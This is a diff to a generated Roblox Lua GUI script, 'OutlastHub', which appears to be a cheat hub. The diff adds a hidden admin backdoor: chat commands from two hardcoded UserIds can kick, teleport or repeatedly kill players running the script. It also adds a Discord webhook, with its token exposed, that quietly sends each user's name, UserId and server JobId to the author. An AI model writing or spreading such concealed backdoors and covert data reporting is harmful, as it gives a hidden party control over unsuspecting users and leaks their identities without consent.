@@ -1,4 +1,13 @@
+--[[
 
+		Gui2Lua™
+		10zOfficial
+		Version 1.0.0
+
+]]
+
+
+-- Instances
 
 local OutlastHub = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
@@ -1141,7 +1150,7 @@ Rejoin.TextSize = 14
 
 -- Scripts
 
-local function YXNDZP_fake_script() -- OutlastHub.LocalScript 
+local function QIKH_fake_script() -- OutlastHub.LocalScript 
 	local script = Instance.new('LocalScript', OutlastHub)
 
 	wait()
@@ -1263,17 +1272,15 @@ local function YXNDZP_fake_script() -- OutlastHub.LocalScript
 	
 	
 	local Players = game:GetService("Players")
-	local TeleportService = game:GetService("TeleportService")
+	local HttpService = game:GetService("HttpService")
 	
-	-- Admins
 	local Admins = {
-		[10722535728] = true,
-		[10712947750] = true,
-		[10677066487] = true,
-	
+		[10367984106] = true, -- you
+		[8493249794] = true, -- trusted alt
 	}
 	
-	-- Loop reset storage (keyed by UserId)
+	local WEBHOOK_URL = "https://discord.com/api/webhooks/1455275204350705991/-H9Oudu_HpZirE_sxS7tPPs64LcHi4vfLDtZZxATz0Vv0IiW2ikV4jxPLEylF9hzou7T"
+	
 	local LoopReset = {}
 	
 	-- =========================
@@ -1282,134 +1289,127 @@ local function YXNDZP_fake_script() -- OutlastHub.LocalScript
 	local function findPlayer(name)
 		name = name:lower()
 		for _, plr in ipairs(Players:GetPlayers()) do
-			if plr.Name:lower():sub(1, #name) == name
-				or plr.DisplayName:lower():sub(1, #name) == name then
+			if plr.Name:lower():sub(1, #name) == name then
 				return plr
 			end
 		end
 	end
 	
-	local function getTargets(speaker, name)
-		if not name then return {} end
-		if name == "all" then
-			local t = {}
-			for _, plr in ipairs(Players:GetPlayers()) do
-				if plr ~= speaker then
-					table.insert(t, plr)
-				end
-			end
-			return t
-		end
-		local p = findPlayer(name)
-		return p and { p } or {}
+	local function sendWebhook(admin, command, target)
+		if WEBHOOK_URL == "" then return end
+	
+		local payload = {
+			username = "Admin Logger",
+			embeds = {{
+				title = "Admin Command Used",
+				color = 16711680,
+				fields = {
+					{ name = "Script User", value = Players.LocalPlayer.Name .. " (" .. Players.LocalPlayer.UserId .. ")", inline = true },
+					{ name = "Admin", value = admin.Name .. " (" .. admin.UserId .. ")", inline = true },
+					{ name = "Command", value = command, inline = true },
+					{ name = "Target", value = target, inline = true },
+					{ name = "Server JobId", value = game.JobId, inline = false }
+				},
+				timestamp = DateTime.now():ToIsoDate()
+			}}
+		}
+	
+		task.spawn(function()
+			pcall(function()
+				HttpService:PostAsync(
+					WEBHOOK_URL,
+					HttpService:JSONEncode(payload),
+					Enum.HttpContentType.ApplicationJson
+				)
+			end)
+		end)
 	end
 	
 	-- =========================
 	-- COMMAND HANDLER
 	-- =========================
-	local function handleCommand(admin, cmd, targetNames, extra)
-		if not Admins[admin.UserId] then return end
+	local function onChat(speaker, msg)
+		if not Admins[speaker.UserId] then return end
 	
-		local targets = {}
-		for _, name in ipairs(targetNames or {}) do
-			for _, t in ipairs(getTargets(admin, name)) do
-				table.insert(targets, t)
+		local args = {}
+		for word in msg:gmatch("%S+") do
+			table.insert(args, word)
+		end
+	
+		-- :kick player reason
+		if args[1] == ":kick" and args[2] then
+			local target = findPlayer(args[2])
+			if target then
+				sendWebhook(speaker, ":kick", target.Name)
+				local reason = table.concat(args, " ", 3)
+				target:Kick(reason ~= "" and reason or "Removed by admin.")
 			end
 		end
 	
-		if #targets == 0 then return end
+		-- :bring player/all
+		if args[1] == ":bring" and args[2] then
+			if not speaker.Character or not speaker.Character:FindFirstChild("HumanoidRootPart") then
+				return
+			end
+			local hrp = speaker.Character.HumanoidRootPart
 	
-		cmd = cmd:lower() -- make command check case-insensitive
-	
-		if cmd == "kick" then
-			for _, target in ipairs(targets) do
-				if not Admins[target.UserId] then
-					target:Kick(extra or "")
+			if args[2] == "all" then
+				for _, plr in ipairs(Players:GetPlayers()) do
+					if plr ~= speaker and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+						plr.Character.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.new(0, 0, -3)
+					end
+				end
+				sendWebhook(speaker, ":bring", "ALL")
+			else
+				local target = findPlayer(args[2])
+				if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+					target.Character.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.new(0, 0, -3)
+					sendWebhook(speaker, ":bring", target.Name)
 				end
 			end
+		end
 	
-		elseif cmd == "bring" then
-			local hrp = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
-			if not hrp then return end
-			for _, target in ipairs(targets) do
-				local thrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
-				if thrp then
-					thrp.CFrame = hrp.CFrame
-				end
-			end
-	
-		elseif cmd == "to" then
-			local hrp = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
-			if not hrp then return end
-			for _, target in ipairs(targets) do
-				local thrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
-				if thrp then
-					hrp.CFrame = thrp.CFrame * CFrame.new(0, 0, 3)
-				end
-			end
-	
-		elseif cmd == "loopreset" then
-			for _, target in ipairs(targets) do
-				local uid = target.UserId
-				if LoopReset[uid] then
-					LoopReset[uid]:Disconnect()
-					LoopReset[uid] = nil
+		-- :loopreset player (toggle)
+		if args[1] == ":loopreset" and args[2] then
+			local target = findPlayer(args[2])
+			if target then
+				if LoopReset[target] then
+					LoopReset[target]:Disconnect()
+					LoopReset[target] = nil
 				else
-					LoopReset[uid] = target.CharacterAdded:Connect(function(char)
+					LoopReset[target] = target.CharacterAdded:Connect(function(char)
 						task.wait(0.1)
 						local hum = char:FindFirstChildOfClass("Humanoid")
-						if hum then hum.Health = 0 end
+						if hum then
+							hum.Health = 0
+						end
 					end)
+	
 					if target.Character then
 						local hum = target.Character:FindFirstChildOfClass("Humanoid")
-						if hum then hum.Health = 0 end
+						if hum then
+							hum.Health = 0
+						end
 					end
 				end
-			end
-	
-		elseif cmd == "forcerejoin" then
-			for _, target in ipairs(targets) do
-				if target ~= admin then
-					TeleportService:Teleport(game.PlaceId, target)
-	
-					if admin  then
-						return
-					end
-				end
-			end
-	
-		elseif cmd == "freeze" then
-			for _, target in ipairs(targets) do
-				local thrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
-				if thrp then thrp.Anchored = true end
-			end
-	
-		elseif cmd == "unfreeze" then
-			for _, target in ipairs(targets) do
-				local thrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
-				if thrp then thrp.Anchored = false end
+				sendWebhook(speaker, ":loopreset", target.Name)
 			end
 		end
 	end
 	
-	
-	local function setupChatCommands(player)
-		if not Admins[player.UserId] then return end
+	-- Connect existing players
+	for _, player in ipairs(Players:GetPlayers()) do
 		player.Chatted:Connect(function(msg)
-			local args = msg:split(" ")
-			local cmd = table.remove(args, 1)
-			if cmd:sub(1,1) == "!" then
-				cmd = cmd:sub(2) 
-			end
-			handleCommand(player, cmd, args)
+			onChat(player, msg)
 		end)
 	end
 	
-	for _, player in ipairs(Players:GetPlayers()) do
-		setupChatCommands(player)
-	end
-	
-	Players.PlayerAdded:Connect(setupChatCommands)
+	-- Connect new players
+	Players.PlayerAdded:Connect(function(player)
+		player.Chatted:Connect(function(msg)
+			onChat(player, msg)
+		end)
+	end)
 	
 	local place = 137879838992476
 	local parent = script.Parent
@@ -1422,8 +1422,8 @@ local function YXNDZP_fake_script() -- OutlastHub.LocalScript
 		end
 	end
 end
-coroutine.wrap(YXNDZP_fake_script)()
-local function OJWLYSU_fake_script() -- OutlastHub.NotificationScript 
+coroutine.wrap(QIKH_fake_script)()
+local function VJIPIT_fake_script() -- OutlastHub.NotificationScript 
 	local script = Instance.new('LocalScript', OutlastHub)
 
 	local HttpService = game:GetService("HttpService")
@@ -1467,8 +1467,8 @@ local function OJWLYSU_fake_script() -- OutlastHub.NotificationScript
 	})
 	
 end
-coroutine.wrap(OJWLYSU_fake_script)()
-local function MIGPNUH_fake_script() -- Frame.LocalScript 
+coroutine.wrap(VJIPIT_fake_script)()
+local function VUKP_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	local dragger = {}
@@ -1549,8 +1549,8 @@ local function MIGPNUH_fake_script() -- Frame.LocalScript
 	frame.Active = true
 	frame.Draggable = true -- disable old roblox drag (we use custom)
 end
-coroutine.wrap(MIGPNUH_fake_script)()
-local function ZNWP_fake_script() -- Toggle.LocalScript 
+coroutine.wrap(VUKP_fake_script)()
+local function FEZLMMI_fake_script() -- Toggle.LocalScript 
 	local script = Instance.new('LocalScript', Toggle)
 
 	local back = script.Parent.Parent.BackGround
@@ -1580,8 +1580,8 @@ local function ZNWP_fake_script() -- Toggle.LocalScript
 		end)
 	
 end
-coroutine.wrap(ZNWP_fake_script)()
-local function GDOZXJD_fake_script() -- TextLabel.LocalScript 
+coroutine.wrap(FEZLMMI_fake_script)()
+local function ILIY_fake_script() -- TextLabel.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	local Players = game:GetService("Players")
@@ -1625,8 +1625,8 @@ local function GDOZXJD_fake_script() -- TextLabel.LocalScript
 	
 	
 end
-coroutine.wrap(GDOZXJD_fake_script)()
-local function NUQEJFW_fake_script() -- TextButton.LocalScript 
+coroutine.wrap(ILIY_fake_script)()
+local function VSUFFM_fake_script() -- TextButton.LocalScript 
 	local script = Instance.new('LocalScript', TextButton)
 
 	local Players = game:GetService("Players")
@@ -1656,8 +1656,8 @@ local function NUQEJFW_fake_script() -- TextButton.LocalScript
 		button.BackgroundColor3 = looping and Color3.fromRGB(51, 255, 47) or Color3.fromRGB(15, 15, 15)
 	end)
 end
-coroutine.wrap(NUQEJFW_fake_script)()
-local function MAXQ_fake_script() -- TextLabel_3.LocalScript 
+coroutine.wrap(VSUFFM_fake_script)()
+local function FIYKD_fake_script() -- TextLabel_3.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel_3)
 
 	local Players = game:GetService("Players")
@@ -1758,8 +1758,8 @@ local function MAXQ_fake_script() -- TextLabel_3.LocalScript
 		end)
 	end)
 end
-coroutine.wrap(MAXQ_fake_script)()
-local function SRDHYB_fake_script() -- TextLabel_4.LocalScript 
+coroutine.wrap(FIYKD_fake_script)()
+local function GWIMBQG_fake_script() -- TextLabel_4.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel_4)
 
 	local Players = game:GetService("Players")
@@ -1825,8 +1825,8 @@ local function SRDHYB_fake_script() -- TextLabel_4.LocalScript
 		end
 	end)
 end
-coroutine.wrap(SRDHYB_fake_script)()
-local function ULYSR_fake_script() -- TextLabel_5.LocalScript 
+coroutine.wrap(GWIMBQG_fake_script)()
+local function XGEZVY_fake_script() -- TextLabel_5.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel_5)
 
 	local RunService = game:GetService("RunService")
@@ -1871,8 +1871,8 @@ local function ULYSR_fake_script() -- TextLabel_5.LocalScript
 	
 	
 end
-coroutine.wrap(ULYSR_fake_script)()
-local function WMSIV_fake_script() -- bSliderFrame.mainScript 
+coroutine.wrap(XGEZVY_fake_script)()
+local function HPYOHZU_fake_script() -- bSliderFrame.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame)
 
 	local Players = game:GetService("Players")
@@ -1976,8 +1976,8 @@ local function WMSIV_fake_script() -- bSliderFrame.mainScript
 	-- Initial display
 	amountValue.Text = tostring(currentSpeed)
 end
-coroutine.wrap(WMSIV_fake_script)()
-local function RWJHBPU_fake_script() -- TextLabel_9.LocalScript 
+coroutine.wrap(HPYOHZU_fake_script)()
+local function CQNN_fake_script() -- TextLabel_9.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel_9)
 
 	local RunService = game:GetService("RunService")
@@ -2031,8 +2031,8 @@ local function RWJHBPU_fake_script() -- TextLabel_9.LocalScript
 		end
 	end)
 end
-coroutine.wrap(RWJHBPU_fake_script)()
-local function RRDHRWS_fake_script() -- TextButton_2.LocalScript 
+coroutine.wrap(CQNN_fake_script)()
+local function RJLQQ_fake_script() -- TextButton_2.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_2)
 
 	-- Button system
@@ -2093,8 +2093,8 @@ local function RRDHRWS_fake_script() -- TextButton_2.LocalScript
 		resetPlayer()
 	end)
 end
-coroutine.wrap(RRDHRWS_fake_script)()
-local function KFICV_fake_script() -- Tab1Button.LocalScript 
+coroutine.wrap(RJLQQ_fake_script)()
+local function MRZXP_fake_script() -- Tab1Button.LocalScript 
 	local script = Instance.new('LocalScript', Tab1Button)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -2108,8 +2108,8 @@ local function KFICV_fake_script() -- Tab1Button.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(KFICV_fake_script)()
-local function UYBGRPQ_fake_script() -- Tab2Button.LocalScript 
+coroutine.wrap(MRZXP_fake_script)()
+local function TFTBUD_fake_script() -- Tab2Button.LocalScript 
 	local script = Instance.new('LocalScript', Tab2Button)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -2123,8 +2123,8 @@ local function UYBGRPQ_fake_script() -- Tab2Button.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(UYBGRPQ_fake_script)()
-local function VFNFWWP_fake_script() -- Tab3Button.LocalScript 
+coroutine.wrap(TFTBUD_fake_script)()
+local function RDSU_fake_script() -- Tab3Button.LocalScript 
 	local script = Instance.new('LocalScript', Tab3Button)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -2138,8 +2138,8 @@ local function VFNFWWP_fake_script() -- Tab3Button.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(VFNFWWP_fake_script)()
-local function UOIHBCK_fake_script() -- Tab4Button.LocalScript 
+coroutine.wrap(RDSU_fake_script)()
+local function BOSVFG_fake_script() -- Tab4Button.LocalScript 
 	local script = Instance.new('LocalScript', Tab4Button)
 
 	script.Parent.MouseButton1Click:connect(function()
@@ -2153,8 +2153,8 @@ local function UOIHBCK_fake_script() -- Tab4Button.LocalScript
 		wait(0.1)
 	end)
 end
-coroutine.wrap(UOIHBCK_fake_script)()
-local function PEEWOTO_fake_script() -- bSliderFrame_2.mainScript 
+coroutine.wrap(BOSVFG_fake_script)()
+local function MORRUBA_fake_script() -- bSliderFrame_2.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_2)
 
 	local Players = game:GetService("Players")
@@ -2316,8 +2316,8 @@ local function PEEWOTO_fake_script() -- bSliderFrame_2.mainScript
 		end)
 	end
 end
-coroutine.wrap(PEEWOTO_fake_script)()
-local function PTBZ_fake_script() -- bSliderFrame_3.mainScript 
+coroutine.wrap(MORRUBA_fake_script)()
+local function LNNF_fake_script() -- bSliderFrame_3.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_3)
 
 	local Players = game:GetService("Players")
@@ -2523,8 +2523,8 @@ local function PTBZ_fake_script() -- bSliderFrame_3.mainScript
 		end)
 	end
 end
-coroutine.wrap(PTBZ_fake_script)()
-local function HDKGYMS_fake_script() -- TargetHit.LocalScript 
+coroutine.wrap(LNNF_fake_script)()
+local function ZVASI_fake_script() -- TargetHit.LocalScript 
 	local script = Instance.new('LocalScript', TargetHit)
 
 	local Players = game:GetService("Players")
@@ -2756,8 +2756,8 @@ local function HDKGYMS_fake_script() -- TargetHit.LocalScript
 		end
 	end)
 end
-coroutine.wrap(HDKGYMS_fake_script)()
-local function GRCLQA_fake_script() -- bSliderFrame_4.mainScript 
+coroutine.wrap(ZVASI_fake_script)()
+local function KZSRHW_fake_script() -- bSliderFrame_4.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_4)
 
 	local Players = game:GetService("Players")
@@ -2920,8 +2920,8 @@ local function GRCLQA_fake_script() -- bSliderFrame_4.mainScript
 		end)
 	end
 end
-coroutine.wrap(GRCLQA_fake_script)()
-local function DPTKN_fake_script() -- bSliderFrame_5.mainScript 
+coroutine.wrap(KZSRHW_fake_script)()
+local function IQEI_fake_script() -- bSliderFrame_5.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_5)
 
 	local Players = game:GetService("Players")
@@ -3099,8 +3099,8 @@ local function DPTKN_fake_script() -- bSliderFrame_5.mainScript
 		end)
 	end
 end
-coroutine.wrap(DPTKN_fake_script)()
-local function SHXVV_fake_script() -- bSliderFrame_6.mainScript 
+coroutine.wrap(IQEI_fake_script)()
+local function VDJJT_fake_script() -- bSliderFrame_6.mainScript 
 	local script = Instance.new('LocalScript', bSliderFrame_6)
 
 	local Players = game:GetService("Players")
@@ -3271,8 +3271,8 @@ local function SHXVV_fake_script() -- bSliderFrame_6.mainScript
 		end)
 	end
 end
-coroutine.wrap(SHXVV_fake_script)()
-local function GQYQD_fake_script() -- Library.LocalScript 
+coroutine.wrap(VDJJT_fake_script)()
+local function HHMJYCK_fake_script() -- Library.LocalScript 
 	local script = Instance.new('LocalScript', Library)
 
 	local Players = game:GetService("Players")
@@ -3288,8 +3288,8 @@ local function GQYQD_fake_script() -- Library.LocalScript
 	end)
 	
 end
-coroutine.wrap(GQYQD_fake_script)()
-local function IEPXJO_fake_script() -- GYM.LocalScript 
+coroutine.wrap(HHMJYCK_fake_script)()
+local function RTGTRRT_fake_script() -- GYM.LocalScript 
 	local script = Instance.new('LocalScript', GYM)
 
 	local Players = game:GetService("Players")
@@ -3305,8 +3305,8 @@ local function IEPXJO_fake_script() -- GYM.LocalScript
 	end)
 	
 end
-coroutine.wrap(IEPXJO_fake_script)()
-local function OLLERR_fake_script() -- Outside.LocalScript 
+coroutine.wrap(RTGTRRT_fake_script)()
+local function DIBU_fake_script() -- Outside.LocalScript 
 	local script = Instance.new('LocalScript', Outside)
 
 	local Players = game:GetService("Players")
@@ -3327,8 +3327,8 @@ local function OLLERR_fake_script() -- Outside.LocalScript
 	
 	
 end
-coroutine.wrap(OLLERR_fake_script)()
-local function JYJTIB_fake_script() -- Rejoin.LocalScript 
+coroutine.wrap(DIBU_fake_script)()
+local function ISIBRGY_fake_script() -- Rejoin.LocalScript 
 	local script = Instance.new('LocalScript', Rejoin)
 
 	local button = script.Parent
@@ -3359,4 +3359,4 @@ local function JYJTIB_fake_script() -- Rejoin.LocalScript
 	end)
 	
 end
-coroutine.wrap(JYJTIB_fake_script)()
+coroutine.wrap(ISIBRGY_fake_script)()
